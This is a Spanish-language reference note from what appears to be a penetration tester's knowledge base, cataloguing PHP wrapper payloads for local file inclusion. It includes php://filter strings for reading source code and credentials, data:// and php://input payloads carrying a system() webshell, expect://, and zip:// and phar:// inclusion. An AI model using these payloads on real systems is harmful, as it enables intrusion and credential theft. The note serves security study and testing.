---
tipo: meta
aliases:
  - Payloads LFI wrappers
  - php wrappers
tags:
  - meta/referencia
  - dominio/web
---

# LFI wrappers - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los wrappers de PHP convierten una LFI de lectura en lectura de fuente y en RCE. Solo aplican cuando la ruta va a `include`/`require`/`file_get_contents` de PHP. Criterio en [[LFI - inclusión local]]. `yi``  ` copia.

## Leer código fuente — `php://filter`

Si incluís un `.php` directo, se ejecuta y no ves la fuente. El filtro base64 lo devuelve como texto.

`php://filter/convert.base64-encode/resource=config.php`
Devuelve `config.php` en base64 — lo decodificás y leés las credenciales sin ejecutarlo.

`php://filter/convert.base64-encode/resource=../../../etc/passwd`
Combina con traversal para archivos fuera del directorio.

`php://filter/read=string.rot13/resource=index.php`
Alternativa si base64 está filtrado.

## RCE — filter chains

`php://filter/…cadena larga de conversiones…/resource=/etc/passwd`
Las **filter chains** generan PHP arbitrario a partir de las conversiones de codificación, sin necesidad de subir nada. Se arma con la herramienta `php_filter_chain_generator.py` (synacktiv). Es la vía a RCE más limpia cuando solo tenés `php://filter`.

## RCE — `php://input`

`php://input`  +  cuerpo POST:  `<?php system($_GET['c']); ?>`
La app incluye `php://input`, que es el cuerpo crudo de la petición → ejecuta tu PHP. Requiere `allow_url_include=On`.

## RCE — `data://`

`data://text/plain,<?php system($_GET['c']); ?>`
`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`
Incluye el payload inline. Requiere `allow_url_include=On`.

## RCE — `expect://`

`expect://id`
Ejecuta el comando directo. Requiere la extensión `expect` instalada (raro).

## RCE — `zip://` / `phar://`

`zip://shell.zip%23shell.php`
Subís un zip con un `.php` adentro (por otra vía), lo incluís apuntando dentro del archivo con `#` (`%23`).

`phar://shell.phar/shell.php`
Igual con phar. `phar://` además dispara **deserialización** al abrirse — vía de RCE propia si hay una cadena de gadgets.

## Cuál elijo

| Tengo | Uso |
|---|---|
| Solo lectura, quiero la fuente | `php://filter/convert.base64-encode` |
| LFI a `include`, sin subir nada | filter chains |
| `allow_url_include=On` | `data://` o `php://input` |
| Puedo subir un archivo (aunque no ejecute) | `zip://` / `phar://` + [[MOC - File upload]] |

## Relacionadas

[[LFI - inclusión local]] · [[LFI - de lectura a RCE]] · [[MOC - File inclusion]]
